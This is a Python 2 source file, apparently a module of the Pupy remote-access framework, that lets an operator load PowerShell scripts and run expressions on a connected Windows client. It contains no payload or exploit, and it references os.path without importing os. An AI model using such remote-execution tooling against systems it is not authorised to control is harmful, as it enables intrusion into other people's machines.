# -*- coding: utf-8 -*-

from pupylib.PupyModule import *
from pupylib.utils.term import consize
from argparse import REMAINDER
from pupylib.utils.rpyc_utils import obtain
from pupylib.PupyCmd import PupyCmd
from os import path
from rpyc import GenericException

__class_name__ = 'PowershellManager'

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

@config(compat='windows', category='admin')
class PowershellManager(PupyModule):
    ''' Load/Execute Powershell scripts '''

    dependencies = {
        'windows': [ 'powershell' ]
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(
            prog='psh', description=self.__doc__
        )

        width, _ = consize()

        commands = self.arg_parser.add_subparsers(title='actions')
        loaded = commands.add_parser('loaded', help='List preapred powershell contexts')
        loaded.add_argument('context', nargs='?', help='Check is context with specified name loaded')
        loaded.set_defaults(name='loaded')

        load = commands.add_parser('load', help='Create new powershell context or load more scripts into existing')
        load.add_argument('-F', '--force', action='store_true', default=False, help='Destroy old context if exists')
        load.add_argument('-64', '--try-64', action='store_true', default=False, help='Try amd64 if possible')
        load.add_argument('-2', '--try-v2', action='store_true', default=None, help='Try version 2 if possible')
        load.add_argument('-W', '--width', default=width, type=int, help='Set output line width')
        load.add_argument('-D', '--daemon', action='store_true', default=False, help='Start in "daemon" mode')
        load.add_argument('context', help='Context name')
        load.add_argument('source', help='Path to PS1 script (local to pupy)')
        load.set_defaults(name='load')

        iex = commands.add_parser('iex', help='Invoke expression in context')
        iex.add_argument('-T', '--timeout', default=None, type=float, help='Set timeout for result retrieval')
        iex.add_argument('-B', '--background', default=False, action='store_true',
                         help='Evaluate in background (async)')
        iex.add_argument('context', help='Context name')
        iex.add_argument('expression', nargs=REMAINDER, help='Expression to evaluate')
        iex.set_defaults(name='iex')

        unload = commands.add_parser('unload', help='Destroy context')
        unload.add_argument('context', help='Context name')
        unload.set_defaults(name='unload')

        result = commands.add_parser('result', help='Retrieve result by request id from context')
        result.add_argument('context', help='Context name')
        result.add_argument('rid', type=int, help='Request id')
        result.set_defaults(name='result')

        results = commands.add_parser('results', help='Retrieve ready RIDs from all contexts')
        results.set_defaults(name='results')

        killall = commands.add_parser('killall', help='Destroy all powershell contexts')
        killall.set_defaults(name='killall')

    def run(self, args):
        powershell = self.client.conn.modules['powershell']

        if args.name == 'loaded':
            if args.context:
                if powershell.loaded(args.context):
                    self.success('{} is loaded'.format(args.context))
                else:
                    self.error('{} is not loaded'.format(args.context))
            else:
                contexts = obtain(powershell.loaded())
                for context in contexts:
                    self.success('{}'.format(context))

        elif args.name == 'load':
            script = path.expandvars(path.expanduser(args.source))
            if not path.exists(script):
                self.error('Script file not found: {}'.format(script))
                return

            with open(script) as input:
                content = input.read()

            try:
                powershell.load(
                    args.context, content, args.force, args.try_64,
                    args.daemon, args.width, args.try_v2
                )
            except Exception, e:
                self.error('load: {}'.format(e))

        elif args.name == 'iex':
            expression = ' '.join(args.expression)

            if not powershell.loaded(args.context):
                self.error('Context {} is not loaded'.format(args.context))
                return

            if not expression:
                self.warning('Empty expression')
                return

            try:
                result = powershell.call(
                    args.context, expression, timeout=args.timeout, async=args.background
                )

                if args.background:
                    self.warning('Queued: Context: {} RID: {}'.format(args.context, result.rid))
                else:
                    output, rest = result

                    if rest:
                        self.warning(rest)
                    if output:
                        self.log(output)

            except GenericException as e:
                if type(e).__name__ == 'powershell.PowershellTimeout':
                    self.error('iex: timeout: Context: {} RID: {}'.format(args.context, e.args[0]))
                else:
                    self.error('iex: {}'.format(e))

            except Exception, e:
                self.error('iex: {}'.format(e))

        elif args.name == 'unload':
            try:
                powershell.unload(args.context)
            except Exception, e:
                self.error('unload: {}'.format(e))

        elif args.name == 'result':
            result = powershell.result(args.context, args.rid)
            if not result:
                self.error('Result {} does not exists in {}'.format(args.rid, args.context))
            else:
                output, rest = result
                if rest:
                    self.warning(rest)
                if output:
                    self.log(output)

        elif args.name == 'results':
            if not obtain(powershell.loaded()):
                self.error('No scripts loaded')
                return

            results = obtain(powershell.results.fget())
            objects = [
                {
                    'CONTEXT': ctx,
                    'RIDS': ', '.join([str(x) for x in rids])
                } for ctx, rids in results.iteritems()
            ]
            self.stdout.write(
                PupyCmd.table_format(objects, wl=[
                    'CONTEXT', 'RIDS'
                ]))

        elif args.name == 'killall':
            powershell.stop()
